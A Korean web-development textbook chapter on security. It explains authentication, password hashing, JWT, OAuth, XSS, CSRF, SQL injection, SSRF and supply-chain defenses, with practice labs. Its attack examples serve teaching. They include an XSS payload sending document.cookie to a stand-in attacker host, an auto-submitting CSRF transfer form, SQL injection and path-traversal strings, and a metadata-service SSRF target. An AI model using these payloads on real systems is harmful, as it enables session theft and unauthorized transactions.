이 책 곳곳에 보안이 조금씩 나왔습니다. 4장의 사용자 모드와 권한, 5장의 코드 서명, 6장의 사이트 격리, 10장의 ARP 스푸핑, 14장의 HTTPS와 CORS와 쿠키, 16장의 서버를 지키는 기본. 이 장은 그것들을 한데 모으고, 웹 개발자가 꼭 알아야 할 공격과 방어를 정리합니다. 보안은 하나의 기술이 아니라 모든 층에서 조금씩 지키는 습관입니다.

## 무엇을 지키나

보안이 지키려는 것은 세 가지로 정리되고, 머리글자로 CIA라고 부릅니다.

| 성질 | 뜻 | 깨지는 예 |
| --- | --- | --- |
| 기밀성 (Confidentiality) | 허락된 사람만 본다 | 개인 정보 유출, 남의 메시지 열람 |
| 무결성 (Integrity) | 허락 없이 바뀌지 않는다 | 송금액 조작, 글 변조, 악성 코드 삽입 |
| 가용성 (Availability) | 필요할 때 쓸 수 있다 | 서비스 거부 공격으로 사이트가 멈춤 |

모든 것을 완벽하게 지킬 수는 없으니, 먼저 [[위협 모델]]을 세웁니다. 무엇이 소중한지(자산), 누가 노리는지(공격자), 어디로 들어올 수 있는지(공격 표면), 뚫리면 얼마나 아픈지를 적어 보고 중요한 것부터 막습니다.

두 가지 원칙이 거의 모든 방어의 바탕입니다.

- **[[최소 권한 원칙]]**: 사람이든 프로그램이든 일에 꼭 필요한 권한만 줍니다. 웹 서버를 root로 돌리지 않고(4장), 배포 키로는 배포만 하게 하고(15장), DB 계정에는 필요한 테이블 권한만 줍니다.
- **[[심층 방어]]**: 한 겹이 뚫려도 다음 겹이 막도록 여러 겹으로 지킵니다. 클라우드 방화벽, 서버 방화벽, 앱의 인증, DB 권한, 암호화가 각자 따로 지킵니다.

## 인증과 인가

비슷해 보이지만 다른 두 질문입니다.

- **[[인증]]**(authentication): 너는 누구냐? 비밀번호, 패스키, 인증서로 확인합니다. 실패하면 401.
- **[[인가]]**(authorization): 너는 이걸 해도 되냐? 확인된 사용자가 이 글을 지우거나 관리 화면을 볼 권한이 있는지 봅니다. 실패하면 403.

실제 사고는 인가에서 많이 납니다. 로그인한 사용자가 `GET /api/orders/1235`의 숫자만 바꿔 남의 주문을 보는 일이 대표적입니다. 화면에 버튼을 숨기는 것은 인가가 아닙니다. **서버가 요청마다 "이 사용자가 이 자원의 주인인가"를 확인해야 합니다.** OWASP가 꼽는 웹 보안 위험 1위가 이 "망가진 접근 제어"입니다.

## 비밀번호를 저장하는 법

비밀번호를 데이터베이스에 그대로 저장하면, DB가 한 번 털리는 순간 모든 사용자의 비밀번호가 나갑니다. 사람들은 비밀번호를 여러 사이트에 같이 쓰니 피해가 다른 사이트로 번집니다.

그래서 비밀번호는 14장의 해시 함수로 바꿔 저장하고, 로그인할 때 입력값을 같은 방법으로 해시해 비교합니다. 해시는 되돌릴 수 없으니 DB가 털려도 원래 비밀번호는 바로 나오지 않습니다. 하지만 두 가지를 더 해야 합니다.

1. **[[솔트]]**: 사용자마다 다른 무작위 값을 비밀번호에 섞어서 해시합니다. 솔트가 없으면 같은 비밀번호는 같은 해시가 나와서, 흔한 비밀번호의 해시를 미리 계산해 둔 표로 한꺼번에 알아낼 수 있습니다. 솔트는 비밀이 아니라 해시와 함께 저장합니다.
2. **일부러 느린 해시**: SHA-256은 빠르게 만들어진 해시라서 GPU로 1초에 수십억 번 계산합니다. 공격자가 모든 후보를 넣어 보기 쉽습니다. 비밀번호에는 일부러 느리고 메모리를 많이 쓰게 만든 bcrypt, scrypt, Argon2를 씁니다. 사용자 한 명의 로그인에 0.1초는 괜찮지만, 공격자의 수십억 번 시도에는 치명적으로 느립니다.

이 사이트의 API도 이렇게 저장합니다(`apps/api/src/security.ts`).

```ts apps/api/src/security.ts를 간추린 것
export async function hashPassword(password: string) {
  const salt = randomBytes(16);                              // 사용자마다 다른 솔트
  const hash = await scrypt(password, salt, 64);             // 일부러 느린 해시
  return `scrypt$${salt.toString("hex")}$${hash.toString("hex")}`; // 솔트를 함께 저장
}
// 비교는 timingSafeEqual로: 앞 글자부터 다르면 일찍 끝나는 비교는
// 걸린 시간으로 몇 글자가 맞았는지 새어 나갈 수 있습니다
```

비밀번호는 결국 빼앗기거나 추측당할 수 있습니다. 그래서 하나를 더 확인하는 [[다중 인증]](MFA)을 붙입니다. 휴대폰의 인증 앱 숫자(TOTP), 보안 키 같은 것입니다. 문자 메시지 인증은 유심 탈취에 약해서 가장 약한 방법으로 봅니다.

## 패스키: 비밀번호 없는 로그인

[[패스키]]는 비밀번호 대신 14장의 공개키 서명으로 로그인하는 방식입니다(WebAuthn 표준). 15장의 SSH 공개키 인증과 같은 원리를 웹으로 가져온 것입니다.

1. 가입할 때 기기가 이 사이트 전용의 키 짝을 만들고, 공개키만 서버에 보냅니다. 개인키는 기기의 보안 칩 안에 남고 지문이나 얼굴로만 꺼내 쓸 수 있습니다.
2. 로그인할 때 서버가 무작위 값을 주면 기기가 개인키로 서명하고, 서버가 공개키로 확인합니다.

서버에는 공개키만 있으니 털려도 쓸모가 없고, 키가 도메인에 묶여 있어 가짜 사이트(피싱)에서는 아예 동작하지 않습니다. Apple, Google, Microsoft 계정이 기기 사이에서 패스키를 동기화해 줍니다.

## 로그인 상태 유지: 세션과 토큰

14장에서 HTTP는 무상태라 쿠키로 로그인 상태를 이어 간다고 했습니다. 방법은 두 가지입니다.

| | 세션 (서버 저장) | 토큰 (서명된 값) |
| --- | --- | --- |
| 쿠키에 든 것 | 무작위 세션 ID | 사용자 정보와 만료 시각 + 서명 |
| 서버가 하는 일 | 요청마다 저장소에서 ID를 찾음 | 서명만 확인. 저장소가 필요 없음 |
| 강제 로그아웃 | 저장소에서 지우면 끝 | 만료 전까지 막기 어려움 (차단 목록을 따로 둬야 함) |
| 예 | 전통적인 웹 앱 | [[JWT]], 이 사이트의 API(HMAC 서명 쿠키) |

[[JWT]](JSON Web Token)는 `헤더.내용.서명`을 Base64(1장)로 이은 문자열입니다. 내용은 암호화가 아니라 그냥 인코딩이라 **누구나 읽을 수 있습니다.** 서명은 내용이 바뀌지 않았다는 것만 보장합니다. 그러니 JWT에 비밀을 넣으면 안 됩니다.

토큰을 브라우저 어디에 둘지도 중요합니다. `localStorage`에 두면 페이지의 모든 JS가 읽을 수 있어서, 아래의 XSS가 한 번만 성공해도 토큰을 훔쳐 갑니다. `HttpOnly` 쿠키에 두면 JS가 읽을 수 없습니다. 대신 쿠키는 자동으로 따라가니 CSRF를 함께 막아야 합니다.

## OAuth와 소셜 로그인

"Google로 로그인", "카카오로 로그인"은 [[OAuth]] 2.0과 그 위의 OpenID Connect로 동작합니다. 핵심은 **우리 서비스가 사용자의 Google 비밀번호를 받지 않는다**는 것입니다.

1. 사용자가 "Google로 로그인"을 누르면 Google의 로그인 페이지로 이동합니다. 주소에 우리 앱 ID, 돌아올 주소, 요청하는 권한(이메일, 프로필)이 붙어 있습니다.
2. 사용자는 Google에서 로그인하고 "이 앱에 이메일과 프로필을 보여 줄까요?"에 동의합니다.
3. Google이 일회용 코드를 붙여 우리 서비스의 돌아올 주소로 보냅니다.
4. 우리 서버가 그 코드와 앱 비밀 값을 Google에 보내 토큰으로 바꿉니다. 이 교환은 브라우저가 아니라 서버끼리 합니다.
5. 받은 ID 토큰(JWT)에서 이 사람이 누구인지 확인하고, 우리 서비스의 로그인 상태를 만듭니다.

중간에 코드를 가로채 쓰지 못하도록, 브라우저 앱은 시작할 때 만든 무작위 값의 해시를 보냈다가 교환할 때 원래 값을 내미는 PKCE를 함께 씁니다. 돌아올 주소는 미리 등록한 것만 허락해서, 공격자 사이트로 코드가 새지 않게 합니다.

## XSS: 남의 스크립트가 내 페이지에서 돈다

[[XSS]](크로스 사이트 스크립팅)는 공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 우리 사이트의 일부로 실행되는 공격입니다. 우리 출처(14장)에서 도니 동일 출처 정책이 막지 못하고, 그 사용자로서 무엇이든 할 수 있습니다. 쿠키(HttpOnly가 아니면)와 localStorage를 읽고, 그 사용자 이름으로 글을 쓰고, 화면을 가짜 로그인 창으로 바꿉니다.

```html
<!-- 댓글 내용을 그대로 HTML에 넣으면 -->
<div class="comment">${comment}</div>
<!-- 공격자가 이런 댓글을 남김 -->
<img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">
```

| 종류 | 스크립트가 들어오는 길 |
| --- | --- |
| 저장형 | DB에 저장된 댓글, 프로필, 글 |
| 반사형 | URL의 쿼리를 그대로 응답 페이지에 출력 (`/search?q=<script>…`) |
| DOM 기반 | 프론트엔드 JS가 `location.hash` 같은 값을 `innerHTML`에 넣음 |

막는 법은 "데이터를 코드로 해석되지 않게" 하는 것입니다.

- **출력할 때 이스케이프**: `<`를 `&lt;`로 바꿔 글자로만 보이게 합니다. React, Vue, Svelte는 `{값}`을 기본으로 이스케이프합니다. 이 사이트의 마크다운 변환기도 모든 글자를 먼저 이스케이프합니다.
- **위험한 통로를 피하기**: `innerHTML`, React의 `dangerouslySetInnerHTML`, `eval`, `new Function`, 사용자가 준 `href="javascript:…"`. 꼭 HTML을 넣어야 하면 DOMPurify 같은 검증된 정리기를 거칩니다.
- **[[CSP]]** (Content Security Policy): 응답 헤더로 "이 페이지는 이 출처의 스크립트만 실행한다"고 브라우저에 알립니다. 그러면 XSS로 스크립트를 넣어도 실행되지 않습니다. 심층 방어의 마지막 겹입니다.
- **HttpOnly 쿠키**: 뚫려도 세션 쿠키는 훔쳐 가지 못하게.

## CSRF: 내 브라우저가 나도 모르게 요청한다

[[CSRF]](사이트 간 요청 위조)는 사용자가 로그인해 둔 사이트에, 공격자의 페이지가 사용자의 브라우저를 시켜 요청을 보내게 하는 공격입니다. 브라우저는 그 사이트로 가는 요청에 쿠키를 자동으로 붙이니, 서버는 사용자가 직접 보낸 요청으로 착각합니다.

```html
<!-- evil.example 페이지에 숨겨진 폼. 열기만 하면 자동 제출 -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="1000000">
</form>
<script>document.forms[0].submit()</script>
```

CORS는 응답을 읽는 걸 막을 뿐 요청이 가는 것 자체는 막지 않습니다. 송금은 이미 일어난 뒤입니다. 막는 법입니다.

- **`SameSite` 쿠키**: `Lax`(요즘 브라우저의 기본)면 다른 사이트에서 시작된 POST에 쿠키를 붙이지 않습니다. 이 사이트의 API 쿠키도 `SameSite=Lax`입니다. 가장 효과가 큰 방어입니다.
- **CSRF 토큰**: 폼마다 서버가 준 무작위 값을 함께 보내게 하고 확인합니다. 공격자 페이지는 이 값을 알 수 없습니다.
- **`Origin` 헤더 확인**: 상태를 바꾸는 요청의 `Origin`이 우리 출처인지 서버가 확인합니다.
- **상태 변경은 GET으로 하지 않기** (14장의 안전한 메서드).

## SQL 인젝션: 데이터가 명령이 된다

[[SQL 인젝션]]은 사용자 입력을 SQL 문자열에 그대로 이어 붙여서, 입력이 SQL 명령의 일부로 실행되는 공격입니다. XSS가 HTML에서 일어나는 일을 SQL에서 일으키는 것입니다.

```js
// 위험: 입력을 문자열로 이어 붙임
db.query(`SELECT * FROM users WHERE email = '${email}' AND password_hash = '${hash}'`);
// email에 ' OR '1'='1' -- 를 넣으면 WHERE가 늘 참이 되고 나머지는 주석이 됨

// 안전: 매개변수화된 쿼리. 값은 SQL과 따로 전달되어 절대 명령으로 해석되지 않음
db.query("SELECT * FROM users WHERE email = $1", [email]);
```

[[매개변수화된 쿼리]]만 쓰면 사실상 완전히 막힙니다. ORM과 쿼리 빌더는 기본으로 이렇게 합니다. 같은 원리의 공격이 다른 곳에도 있습니다. 사용자 입력을 셸 명령에 이어 붙이면 명령 인젝션(`exec("convert " + filename)`), 로그에 그대로 쓰면 로그 위조가 됩니다. **입력은 늘 데이터로만 다루고, 코드와 섞지 않는다**가 모든 인젝션의 답입니다.

## 그 밖의 웹 공격들

| 공격 | 무슨 일 | 막는 법 |
| --- | --- | --- |
| [[클릭재킹]] | 우리 페이지를 투명한 iframe으로 덮어 씌워, 사용자가 엉뚱한 버튼을 누르게 함 | `Content-Security-Policy: frame-ancestors 'self'` 또는 `X-Frame-Options: DENY` |
| [[SSRF]] | "이 URL의 미리 보기를 만들어 줘" 같은 기능에 내부 주소(`http://169.254.169.254`, `localhost:6379`)를 넣어 서버가 내부망을 대신 찌르게 함 | 서버가 요청할 주소를 허락 목록으로 제한하고 사설 IP(11장)를 막음 |
| [[경로 조작]] | 파일 이름에 `../../etc/passwd`를 넣어 허락된 폴더 밖의 파일을 읽음 (8장의 상대 경로) | 경로를 정규화한 뒤 허락된 폴더 안인지 확인, 사용자 입력을 파일 경로로 쓰지 않기 |
| 열린 리다이렉트 | `?next=https://evil.example`로 로그인 후 공격자 사이트로 보내 피싱에 이용 | 돌아갈 주소는 우리 도메인의 경로만 허락 |
| 대량 할당 | 요청 본문의 모든 필드를 DB에 그대로 넣어 `isAdmin: true`가 들어감 | 받을 필드를 스키마(zod 등)로 정해 검증 |

SSRF는 클라우드에서 특히 위험합니다. 클라우드 서버 안에서 `169.254.169.254`로 요청하면 그 서버의 임시 자격 증명을 내주는 메타데이터 서비스가 있기 때문입니다.

## 공급망 공격: 내가 쓰는 코드가 공격받는다

프론트엔드 프로젝트 하나는 npm 패키지를 수백~수천 개 씁니다. 그중 하나라도 악성 코드가 들어가면 우리 코드가 됩니다. 이게 [[공급망 공격]]입니다. 유지 관리자의 계정을 털어 인기 패키지에 악성 버전을 올리거나, 이름이 비슷한 가짜 패키지(`reactt`)를 올리거나, 설치 스크립트(`postinstall`)로 개발자 컴퓨터의 비밀 값을 훔쳐 갑니다. 실제로 매년 큰 사건이 일어납니다.

- **잠금 파일을 커밋하고 CI에서는 그대로 설치합니다.** `pnpm-lock.yaml`은 정확한 버전과 내용 해시(14장의 해시)를 적어 두어 같은 코드만 설치되게 합니다. `pnpm install --frozen-lockfile`.
- **새 의존성은 신중하게.** 몇 줄짜리 기능을 위해 패키지를 추가하지 않습니다.
- **설치 스크립트를 제한합니다.** pnpm은 기본으로 허락한 패키지의 설치 스크립트만 실행합니다.
- **알려진 취약점을 점검합니다.** `npm audit`, GitHub Dependabot.
- **CI가 받아 오는 도구의 해시를 확인합니다.** 이 저장소의 CI는 gitleaks를 받아 쓸 때 미리 적어 둔 SHA-256과 비교한 뒤에만 실행합니다(`.github/workflows/ci.yml`).

## 비밀 값 다루기

API 키, DB 비밀번호, 서명용 비밀 키는 코드와 분리합니다.

- **Git에 올리지 않습니다.** 한 번 올라간 비밀은 지워도 기록에 남고, 공개 저장소라면 몇 분 안에 봇이 찾아 씁니다. 실수로 올렸다면 지우는 것보다 그 키를 **즉시 폐기하고 새로 만드는 것**이 먼저입니다.
- **환경 변수나 비밀 저장소로 넣습니다.** 이 사이트는 서버의 `.env` 파일(저장소에 없음)과 GitHub Actions의 Secrets를 씁니다.
- **기계가 검사하게 합니다.** 이 저장소의 CI는 모든 PR에서 저장소 파일과 커밋 기록 전체를 비밀 값 검사기(자체 스크립트와 gitleaks)로 훑습니다.
- **프론트엔드에 넣은 값은 비밀이 아닙니다.** `VITE_`나 `NEXT_PUBLIC_`으로 시작하는 환경 변수는 빌드 결과 JS에 그대로 들어가 누구나 봅니다. 비밀 키가 필요한 호출은 서버를 거칩니다.

## 서비스를 멈추게 하는 공격: DoS

가용성을 노리는 공격도 있습니다. 서버가 감당 못 할 만큼 요청을 보내 다른 사용자가 못 쓰게 하는 [[DoS]](서비스 거부)이고, 수많은 감염된 기기에서 한꺼번에 보내면 DDoS라고 합니다.

- **네트워크 폭주**: 회선 자체를 채웁니다. 서버 혼자서는 못 막고 CDN이나 클라우드의 DDoS 방어(17장)가 앞에서 흡수합니다.
- **비싼 요청 노리기**: 큰 업로드, 느린 검색, 무거운 계산을 반복합니다. 리버스 프록시의 본문 크기 제한(이 사이트 블로그 API의 6MB 제한, 14장의 413)과 [[요청 수 제한]](429), 시간 제한으로 막습니다.
- **[[ReDoS]]**: 20장에서 본 것처럼 백트래킹이 폭발하는 정규식에 맞춘 입력 하나로 Node의 이벤트 루프(6장)를 몇 초씩 멈춥니다. 사용자 입력에 쓰는 정규식은 중첩된 반복을 피하고 입력 길이를 제한합니다.
- **해시 플러딩**: 18장의 해시 테이블 충돌을 노리는 입력.

## 보안 헤더 정리

응답 헤더 몇 줄로 브라우저에게 방어를 맡길 수 있습니다.

| 헤더 | 하는 일 | 이 저장소 |
| --- | --- | --- |
| `Strict-Transport-Security` | HTTPS로만 접속 (14장) | Caddy가 모든 사이트에 |
| `Content-Security-Policy` | 실행할 수 있는 스크립트, 불러올 자원, iframe 허용 범위 제한 | |
| `X-Content-Type-Options: nosniff` | MIME 타입 추측 금지 (14장) | nginx 설정 |
| `Referrer-Policy` | 다른 사이트로 갈 때 주소를 얼마나 알릴지 | nginx 설정 (`strict-origin-when-cross-origin`) |
| `X-Frame-Options`, CSP `frame-ancestors` | 다른 사이트의 iframe에 들어가지 않음 (클릭재킹) | |
| `Permissions-Policy` | 카메라, 위치 같은 기능을 쓸 수 있는 범위 | |
| `-Server` (헤더 지우기) | 서버 프로그램 이름과 버전을 숨김 | Caddy 공통 설정 |

## 이 저장소가 쓰는 방어 한눈에

| 층 | 방어 | 장 |
| --- | --- | --- |
| 네트워크 | 클라우드 방화벽은 22, 80, 443만. 앱 컨테이너는 바깥에 포트를 열지 않음 | 16, 17 |
| 전송 | 모든 사이트 HTTPS 자동, HSTS | 14, 16 |
| 서버 접근 | 배포 키는 `command=`로 `deploy.sh`만 실행, 인자도 정규식으로 검사 | 15 |
| 앱 | scrypt + 솔트 비밀번호, HMAC 서명 쿠키(`HttpOnly`, `SameSite=Lax`), CORS 허락 목록, 본문 크기 제한 | 14, 이 장 |
| 출력 | 마크다운 변환기와 React가 기본으로 이스케이프 | 이 장 |
| 비밀 | `.env`는 서버에만, CI가 모든 PR에서 비밀 값 검사 | 이 장 |
| 공급망 | 잠금 파일 고정 설치, 받아 쓰는 도구의 해시 확인 | 이 장 |
| 노출 줄이기 | 관리용 사이트에 `X-Robots-Tag: noindex` | 17 |

## 프론트엔드와 이어지는 곳

- `dangerouslySetInnerHTML`과 `innerHTML`을 쓰는 곳을 찾아, 사용자 입력이 섞일 수 있으면 정리기를 거치게 합니다.
- 토큰은 가능하면 `HttpOnly` 쿠키에 두고, `localStorage`에 두어야 한다면 XSS를 더 엄격하게 막습니다.
- 버튼을 숨기는 것은 보안이 아닙니다. 권한 확인은 늘 서버에서 합니다.
- `NEXT_PUBLIC_`, `VITE_` 환경 변수에는 공개돼도 괜찮은 값만 넣습니다.
- 새 패키지를 추가하기 전에 주간 다운로드, 유지 관리 상태, 설치 스크립트 여부를 봅니다.

## 용어 정리

:::terms
- 위협 모델 (threat model) — 지킬 자산, 공격자, 공격 경로, 피해 크기를 정리해 무엇을 먼저 막을지 정하는 분석입니다.
- 최소 권한 원칙 (principle of least privilege) — 사람과 프로그램에 일에 꼭 필요한 권한만 주는 원칙입니다.
- 심층 방어 (defense in depth) — 한 겹이 뚫려도 다른 겹이 막도록 여러 층에서 따로 지키는 방법입니다.
- 인증 (authentication) — 요청한 사람이 누구인지 확인하는 것. 실패하면 401입니다.
- 인가 (authorization) — 확인된 사람이 그 일을 해도 되는지 확인하는 것. 실패하면 403입니다.
- 솔트 (salt) — 비밀번호를 해시하기 전에 사용자마다 섞는 무작위 값. 같은 비밀번호도 다른 해시가 되게 합니다.
- 다중 인증 (MFA, Multi-Factor Authentication) — 비밀번호에 더해 기기나 생체 같은 다른 종류의 확인을 하나 더 요구하는 것입니다.
- 패스키 (passkey) — 기기에 저장한 개인키의 서명으로 로그인하는 비밀번호 없는 인증. 도메인에 묶여 피싱에 강합니다.
- JWT (JSON Web Token) — 헤더, 내용, 서명을 Base64로 이은 토큰. 내용은 누구나 읽을 수 있고 서명은 변조만 막습니다.
- OAuth — 사용자가 비밀번호를 넘기지 않고 다른 서비스에 자기 데이터 접근을 허락하는 표준. 소셜 로그인은 그 위의 OpenID Connect를 씁니다.
- XSS (Cross-Site Scripting) — 공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 그 사이트의 일부로 실행되는 공격입니다.
- CSP (Content Security Policy) — 페이지가 실행하거나 불러올 수 있는 스크립트와 자원의 출처를 응답 헤더로 제한하는 브라우저 기능입니다.
- CSRF (Cross-Site Request Forgery) — 다른 사이트가 사용자의 브라우저를 시켜, 쿠키가 자동으로 붙은 요청을 몰래 보내게 하는 공격입니다.
- SQL 인젝션 (SQL injection) — 사용자 입력이 SQL 문의 일부로 해석되어 의도하지 않은 쿼리가 실행되는 공격입니다.
- 매개변수화된 쿼리 (parameterized query) — SQL 문과 값을 따로 전달해 값이 명령으로 해석되지 않게 하는 쿼리 방식입니다.
- 클릭재킹 (clickjacking) — 페이지를 투명한 iframe으로 겹쳐 사용자가 모르고 다른 버튼을 누르게 하는 공격입니다.
- SSRF (Server-Side Request Forgery) — 서버가 대신 요청을 보내는 기능을 이용해 내부망이나 메타데이터 서비스에 접근하는 공격입니다.
- 경로 조작 (path traversal) — 파일 경로에 `../`를 넣어 허락된 폴더 밖의 파일에 접근하는 공격입니다.
- 공급망 공격 (supply chain attack) — 의존성 패키지나 빌드 도구에 악성 코드를 넣어 그걸 쓰는 프로젝트를 공격하는 것입니다.
- DoS (Denial of Service) — 요청이나 트래픽을 쏟아부어 서비스를 쓸 수 없게 만드는 공격. 여러 곳에서 동시에 하면 DDoS입니다.
- 요청 수 제한 (rate limiting) — 사용자나 IP마다 일정 시간에 보낼 수 있는 요청 수를 제한하는 것. 넘으면 429로 답합니다.
- ReDoS (Regular expression Denial of Service) — 백트래킹이 지수적으로 늘어나는 정규식에 맞춘 입력으로 서버를 멈추게 하는 공격입니다.
:::

## 직접 해보기

:::practice xss XSS를 일부러 만들고 막기
아래 페이지를 로컬에서 열고, 검색어에 `<img src=x onerror=alert(document.domain)>`를 넣어 실행되는 걸 확인합니다. 그다음 `innerHTML` 대신 `textContent`로 바꾸거나, 응답에 `Content-Security-Policy: script-src 'self'` 헤더를 붙인 서버로 내보내 어떻게 막히는지 봅니다(인라인 스크립트도 막히니 스크립트를 파일로 빼야 합니다).

```html xss.html
<input id="q" placeholder="검색어"><button id="go">검색</button>
<p id="out"></p>
<script>
  go.onclick = () => { out.innerHTML = "검색 결과: " + q.value; };   // 위험
  // out.textContent = "검색 결과: " + q.value;                       // 안전
</script>
```
:::

:::practice hash-pw 비밀번호 해시 속도 비교하기
같은 비밀번호를 SHA-256과 scrypt로 각각 해시하는 데 걸리는 시간을 재고, 공격자가 1억 개 후보를 시도할 때 각각 얼마나 걸릴지 계산합니다. 같은 비밀번호를 솔트만 바꿔 두 번 해시하면 결과가 달라지는 것도 확인합니다.

```js node
const { createHash, scryptSync, randomBytes } = require("node:crypto");
let t = performance.now();
for (let i = 0; i < 10000; i++) createHash("sha256").update("password123").digest();
console.log("SHA-256 1번:", ((performance.now() - t) / 10000).toFixed(4), "ms");
t = performance.now();
for (let i = 0; i < 10; i++) scryptSync("password123", randomBytes(16), 64);
console.log("scrypt 1번:", ((performance.now() - t) / 10).toFixed(1), "ms");
console.log(scryptSync("pw", randomBytes(16), 16).toString("hex"), scryptSync("pw", randomBytes(16), 16).toString("hex"));
```
:::

:::practice jwt JWT 열어 보기
[jwt.io](https://jwt.io/)의 예시 토큰이나 직접 만든 JWT를 점(`.`)으로 나눠 앞의 두 부분을 Base64로 풀어 봅니다. 서명 없이도 내용이 다 보인다는 걸 확인하고, 내용의 한 글자를 바꾸면 서명 검증이 실패하는지도 봅니다.

```js 브라우저 콘솔
const token = "여기에 JWT를 붙여 넣기";
const [header, payload] = token.split(".").slice(0, 2).map((p) => JSON.parse(atob(p.replace(/-/g, "+").replace(/_/g, "/"))));
console.log(header, payload);
```
:::

:::practice headers 사이트들의 보안 헤더 확인하기
자주 쓰는 사이트 세 곳과 내 프로젝트의 배포 주소에서 응답 헤더를 받아, 이 장의 보안 헤더 표 중 무엇이 있고 없는지 표로 적습니다. [securityheaders.com](https://securityheaders.com/)에 주소를 넣어 점수도 봅니다.

```sh 터미널
curl -sI https://github.com | grep -iE "strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy"
```
:::

:::practice audit 내 프로젝트의 의존성 점검하기
아무 프론트엔드 프로젝트에서 의존성 수와 알려진 취약점을 확인하고, 설치 스크립트를 가진 패키지가 무엇인지 찾아봅니다. 잠금 파일이 커밋되어 있는지, CI가 `--frozen-lockfile`(또는 `npm ci`)로 설치하는지도 확인합니다.

```sh 터미널
pnpm ls --depth Infinity --parseable | wc -l    # 또는 npm ls --all | wc -l
pnpm audit                                       # 또는 npm audit
grep -l '"postinstall"' node_modules/*/package.json node_modules/@*/*/package.json 2>/dev/null | head
```
:::

## 스스로 점검

:::qa 인증과 인가의 차이를 `GET /api/orders/1235` 예로 설명해 보세요.
인증은 이 요청을 보낸 사람이 누구인지(로그인했는지) 확인하는 것이고, 인가는 그 사람이 주문 1235를 볼 권한이 있는지(주문의 주인인지) 확인하는 것입니다. 로그인만 확인하고 주인 확인을 빠뜨리면 숫자만 바꿔 남의 주문을 보는 사고가 납니다.
:::

:::qa 비밀번호를 SHA-256으로 해시해 저장하면 왜 부족한가요?
솔트가 없으면 같은 비밀번호는 같은 해시가 되어 미리 계산한 표로 한꺼번에 알아낼 수 있고, SHA-256은 아주 빨라서 GPU로 1초에 수십억 개 후보를 시도할 수 있습니다. 사용자마다 솔트를 섞고 bcrypt, scrypt, Argon2처럼 일부러 느린 해시를 씁니다.
:::

:::qa React를 쓰면 XSS가 완전히 막히나요?
기본 `{값}` 출력은 이스케이프되니 대부분 막히지만, `dangerouslySetInnerHTML`, 사용자가 준 URL을 `href`에 넣는 경우(`javascript:`), DOM을 직접 만지는 코드, 서버에서 HTML을 만드는 부분은 여전히 위험합니다. CSP를 함께 두어 뚫려도 실행되지 않게 합니다.
:::

:::qa CORS가 있는데도 CSRF가 가능한 이유와, `SameSite=Lax`가 막아 주는 원리는?
CORS는 다른 출처의 스크립트가 응답을 읽는 것을 막을 뿐, 요청이 서버에 가서 처리되는 것은 막지 않습니다. 폼 제출 같은 요청은 쿠키가 붙어 그대로 처리됩니다. `SameSite=Lax` 쿠키는 다른 사이트에서 시작된 POST 요청에 붙지 않아서, 서버가 그 요청을 로그인한 사용자의 것으로 보지 않게 됩니다.
:::

:::qa SQL 인젝션을 막는 가장 확실한 방법과, 같은 원리가 적용되는 다른 공격 하나는?
값을 SQL 문자열에 이어 붙이지 않고 매개변수화된 쿼리로 따로 전달하는 것입니다. 같은 원리로 사용자 입력을 셸 명령에 이어 붙이면 명령 인젝션이 되니, 인자 배열로 넘기는 `execFile`이나 `spawn`을 씁니다.
:::

:::qa API 키를 실수로 공개 저장소에 올렸습니다. 가장 먼저 할 일은?
그 키를 즉시 폐기하고 새 키를 발급하는 것입니다. 커밋을 지워도 기록과 복제본에 남고, 공개 저장소의 비밀은 몇 분 안에 봇이 찾아 쓰기 때문입니다. 그다음 기록에서 지우고, 비밀 값 검사를 CI에 넣어 재발을 막습니다.
:::
